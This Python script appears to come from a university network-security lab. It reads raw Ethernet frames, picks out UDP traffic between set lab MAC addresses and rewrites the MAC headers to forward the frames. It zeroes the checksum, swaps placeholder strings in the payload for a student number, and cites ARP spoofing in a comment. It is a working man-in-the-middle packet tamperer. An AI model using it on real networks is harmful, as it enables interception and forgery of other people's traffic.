#!/usr/bin/env python3

# This program uses the hexdump module. Install it through your distribution's
# package manager (python-hexdump on arch), through pip (pip3 install hexdump)
# or download it at https://pypi.python.org/pypi/hexdump Alternatively, remove
# all calls to hexdump.hexdump(), and print that data some other way.

# import hexdump
import socket
import struct


def main():
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(3))
    s.bind(("eth1", 0))
    
    while True:
        frame, source = s.recvfrom(65565)
        eth_src, eth_dst, eth_type, eth_payload, eth_header_len = parse_ethernet(frame)
        if eth_type != 0x0800:  # IP is type 0x0800
            print("Frame with ethernet type {} received; skipping...".format(
                eth_type))
            continue

        (ip_header_length, ip_total_length, ip_protocol, ip_src, ip_dst,
         ip_payload) = parse_ip(eth_payload)

        if ip_protocol != 17:  # UDP is protocol 17
            # print("Packet with protocol nr. {} received; skipping...".format(
            #     ip_protocol))
            continue

        # selecting the right packets
        if eth_src != b"\x08\x00'b\x02\xee": # aka 08:00:27:62:02:ee
            if eth_dst != b"\x08\x00'\xdf\t\x84": # aka 08:00:27:df:09:84
                if ip_dst != "172.21.153.10":
                    continue
                continue
            continue

        (udp_src_port, udp_dst_port, udp_data_length,
         udp_checksum, udp_payload) = parse_udp(ip_payload)


        new_udp_header = struct.pack("!HHHH",\
             udp_src_port, udp_dst_port, udp_data_length, 0) # 0 as the new checksum
        
        # spoofing: 8:0:27:df:9:84 8:0:27:62:2:ee 0806 42: arp reply 172.21.153.10 is-at 8:0:27:df:9:84
        # calculate total header length before udp header with checksum
        head_len = eth_header_len + ip_header_length 

        new_eth_src = b"\x08\x00'\xdf\t\x84" # 08:00:27:df:09:84
        new_eth_dst = b"\x08\x00'f\x17\xab"  # 08:00:27:66:17:ab

        # new frame with different head, macs and student numbers
        frame1 = new_eth_dst + new_eth_src + frame[12:head_len] + new_udp_header + frame[head_len+8:]
        frame1 = modify_numbers(frame1)
        
        print("----------------------------------------------------------------------------------------------------")
        print("Source (python): {}".format(source))
        print("Full frame:")
        # hexdump.hexdump(frame)
        print("frame:\n", frame)
        print("modified:\n", frame1)
        print("""\nEthernet:
    Src MAC: {} ({})
    Dst MAC: {} ({})
    Type:    {:#06x}""".format(bytes_to_mac(eth_src), eth_src,
                               bytes_to_mac(eth_dst), eth_dst,
                               eth_type))
        print("""IP:
    Header length: {}
    Total length:  {}
    Protocol:      {}
    Src address:   {}
    Dst address:   {}""".format(ip_header_length, ip_total_length,
                                ip_protocol, ip_src, ip_dst))
        print("""UDP:
    Src port:    {}
    Dst port:    {}
    Data length: {}
    Checksum:    {}""".format(udp_src_port, udp_dst_port, udp_data_length,
                              udp_checksum))
        print("Data:")
        # hexdump.hexdump(udp_payload)
        print(udp_payload, "\n")
        s.send(frame1)
        print("\n\n")


def bytes_to_mac(bytesmac):
    return ":".join("{:02x}".format(x) for x in bytesmac)


def parse_ethernet(frame):
    header_length = 14
    header = frame[:header_length]
    dst, src, type_code = struct.unpack("!6s6sH", header)
    if type_code == 0x8100:  # Encountered an 802.1Q tag, compensate.
        header_length = 18
        header = frame[:header_length]
        type_code = struct.unpack("!16xH", header)
    payload = frame[header_length:]
    return src, dst, type_code, payload, header_length


def parse_ip(packet):
    header_length_in_bytes = (packet[0] & 0x0F) * 4
    header = packet[:header_length_in_bytes]
    payload = packet[header_length_in_bytes:]
    (total_length, protocol, src, dst) = struct.unpack_from("!2xH5xB2x4s4s",
                                                            header)
    src = socket.inet_ntoa(src)
    dst = socket.inet_ntoa(dst)
    return header_length_in_bytes, total_length, protocol, src, dst, payload


def parse_udp(packet):
    header_length = 8
    header = packet[:header_length]
    print("header: ", header)
    payload = packet[header_length:]
    src_port, dst_port, data_length, checksum = struct.unpack("!HHHH", header)
    return src_port, dst_port, data_length, checksum, payload

def modify_numbers(packet):
    p1 = packet.replace(b"XXXXXXXXXXXX", b"__S1049877__")
    p2 = p1.replace(b"YYYYYYYYYYYY", b"__S1049877__")
    p3 = p2.replace(b"ZZZZZZZZZZZZ", b"__S1049877__")
    # print(p3)
    return p3

if __name__ == "__main__":
    main()
